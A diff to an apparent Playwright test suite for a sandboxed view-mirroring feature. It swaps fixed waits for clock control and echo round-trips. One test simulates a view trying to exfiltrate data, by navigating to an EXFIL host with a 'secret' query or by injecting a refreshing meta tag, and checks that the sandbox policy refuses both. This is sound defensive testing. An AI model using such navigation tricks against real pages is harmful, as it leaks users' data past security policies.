@@ -10,6 +10,11 @@ import {
 	APP_VIEW_PROXY_CONTENT_SECURITY_POLICY,
 	DEFAULT_UI_BUNDLE_CONTENT_SECURITY_POLICY,
 } from '../packages/ui-bundle/src/index';
+import {
+	advanceRendererClock,
+	holdRendererClock,
+	releaseRendererClock,
+} from './support/renderer-clock';
 
 /**
  * The view recorder and the replica inside the real sandbox (ADR-0039).
@@ -54,7 +59,15 @@ const VIEW = `
 		document.body.append(node);
 	};
 	window.ran = 'script';
+	// The test's echo: answered in the order the view receives and sends.
+	addEventListener('message', (event) => {
+		if (event.source === parent && typeof event.data?.echo === 'number')
+			parent.postMessage({ echo: event.data.echo }, '*');
+	});
 </script>`;
+
+/** How long the recorder gathers changes before it sends them together. */
+const RECORDER_BATCH_MS = 40;
 
 test.beforeAll(async () => {
 	directory = await mkdtemp(path.join(os.tmpdir(), 'terminay-app-view-mirror-'));
@@ -101,7 +114,13 @@ test.afterAll(async () => {
 });
 
 type Spike = {
-	state: { batches: { epoch: number; seq: number; kind: string; bytes: number; parts?: number; reason?: string }[]; reports: { type: string }[]; hold: boolean };
+	state: {
+		batches: { epoch: number; seq: number; kind: string; bytes: number; parts?: number; reason?: string }[];
+		reports: { type: string }[];
+		echoes: number[];
+		hold: boolean;
+	};
+	ping(id: number): void;
 	resnapshot(): void;
 	stop(): void;
 	forge(data: string): void;
@@ -111,6 +130,34 @@ type SpikeWindow = Window & { startMirrorSpike(html: string): void; mirrorSpike:
 
 const inner = (page: Page, id: string): FrameLocator => page.frameLocator(`#${id}`).frameLocator('iframe');
 const batches = (page: Page) => page.evaluate(() => (window as unknown as SpikeWindow).mirrorSpike.state.batches);
+
+let pings = 0;
+/**
+ * A message to the view and its answer back. Messages between the page and
+ * the view keep their order both ways, so when the answer is in, the view
+ * has been given everything the page sent it before, and the page has
+ * everything the view sent before it answered.
+ */
+async function roundTrip(page: Page): Promise<void> {
+	pings += 1;
+	const id = pings;
+	await page.evaluate((ping) => (window as unknown as SpikeWindow).mirrorSpike.ping(ping), id);
+	await expect.poll(() => page.evaluate(() => (window as unknown as SpikeWindow).mirrorSpike.state.echoes)).toContain(id);
+}
+
+/**
+ * Note each load the proxy's own policy refuses its frame, from now on. A
+ * navigation the view makes is refused there, and reported there.
+ */
+async function watchRefusals(page: Page): Promise<() => Promise<string[]>> {
+	const proxy = page.frameLocator('#view').locator('body');
+	await proxy.evaluate(() => {
+		const seen: string[] = [];
+		(window as unknown as { refused: string[] }).refused = seen;
+		document.addEventListener('securitypolicyviolation', (event) => seen.push(event.blockedURI));
+	});
+	return () => proxy.evaluate(() => [...(window as unknown as { refused: string[] }).refused]);
+}
 
 async function open(page: Page): Promise<{ view: FrameLocator; replica: FrameLocator }> {
 	await page.goto(`${origin}/`);
@@ -219,16 +266,23 @@ test('the recorder waits for acknowledgement, restarts from a snapshot on reques
 	test.setTimeout(120_000);
 	const { view, replica } = await open(page);
 
-	// Held batches are not acknowledged, so at most one more is sent.
+	// Held batches are not acknowledged, so at most one more is sent. The
+	// page's clock is held, and each click comes two batching periods after
+	// the last on it: were the recorder not waiting, each would be a batch.
 	await page.evaluate(() => {
 		(window as unknown as SpikeWindow).mirrorSpike.state.hold = true;
 	});
 	const before = (await batches(page)).length;
+	await holdRendererClock(page);
+	expect(await view.locator('body').evaluate(() => '__pwClock' in globalThis)).toBe(true);
 	for (let index = 0; index < 5; index += 1) {
 		await view.locator('#add').click();
-		await page.waitForTimeout(80);
+		await expect(view.locator('#list li')).toHaveCount(index + 1);
+		await advanceRendererClock(page, 2 * RECORDER_BATCH_MS);
 	}
+	await roundTrip(page);
 	expect((await batches(page)).length - before).toBe(1);
+	await releaseRendererClock(page);
 	await page.evaluate(() => (window as unknown as SpikeWindow).mirrorSpike.release());
 	await expect(replica.locator('#list li')).toHaveCount(5);
 
@@ -240,10 +294,14 @@ test('the recorder waits for acknowledgement, restarts from a snapshot on reques
 
 	// Stopped, the recorder sends nothing; started again, it begins with a snapshot.
 	await page.evaluate(() => (window as unknown as SpikeWindow).mirrorSpike.stop());
-	await page.waitForTimeout(200);
+	await roundTrip(page);
 	const stopped = (await batches(page)).length;
+	await holdRendererClock(page);
 	await view.locator('#add').click();
-	await page.waitForTimeout(200);
+	await expect(view.locator('#list li')).toHaveCount(7);
+	await advanceRendererClock(page, 5 * RECORDER_BATCH_MS);
+	await releaseRendererClock(page);
+	await roundTrip(page);
 	expect((await batches(page)).length).toBe(stopped);
 	await page.evaluate(() => (window as unknown as SpikeWindow).mirrorSpike.resnapshot());
 	await expect.poll(async () => (await batches(page)).at(-1)).toMatchObject({ epoch: 3, seq: 0, kind: 'snapshot' });
@@ -355,28 +413,31 @@ test('neither a view nor a mirror can leave the document it was given', async ({
 		.toBe('failed');
 	await page.evaluate((data) => (window as unknown as SpikeWindow).mirrorSpike.forge(data), forged);
 	await expect(replica.locator('#forged')).toHaveText('forged');
-	// The meta is there as an inert element: it refreshes nothing.
+	// The refreshing meta did not come across, so there is nothing left in
+	// the replica that could refresh it.
 	await expect(replica.locator('meta[http-equiv]')).toHaveCount(0);
-	await page.waitForTimeout(1200);
 	await expect(replica.locator('#forged')).toHaveText('forged');
 	expect(asked).toEqual([]);
 
 	// A view that navigates itself would carry data out past its policy and
-	// leave a foreign page speaking as the view. Nothing is requested.
+	// leave a foreign page speaking as the view. The proxy refuses the load,
+	// and nothing is requested.
+	const refused = await watchRefusals(page);
 	await view.locator('body').evaluate((_body, target) => {
 		location.href = `${target}/view?secret=1`;
 	}, EXFIL).catch(() => undefined);
-	await page.waitForTimeout(1200);
+	await expect.poll(refused).toContainEqual(expect.stringMatching(new RegExp(`^${EXFIL}`)));
 	expect(asked).toEqual([]);
 	// The same by a refreshing meta the view writes into itself.
 	const { view: second } = await open(page);
+	const refusedSecond = await watchRefusals(page);
 	await second.locator('body').evaluate((_body, target) => {
 		const meta = document.createElement('meta');
 		meta.httpEquiv = 'refresh';
 		meta.content = `0;url=${target}/meta`;
 		document.head.append(meta);
 	}, EXFIL).catch(() => undefined);
-	await page.waitForTimeout(1200);
+	await expect.poll(refusedSecond).toContainEqual(expect.stringMatching(new RegExp(`^${EXFIL}`)));
 	expect(asked).toEqual([]);
 	// The workspace page itself went nowhere.
 	expect(page.url()).toBe(`${origin}/`);
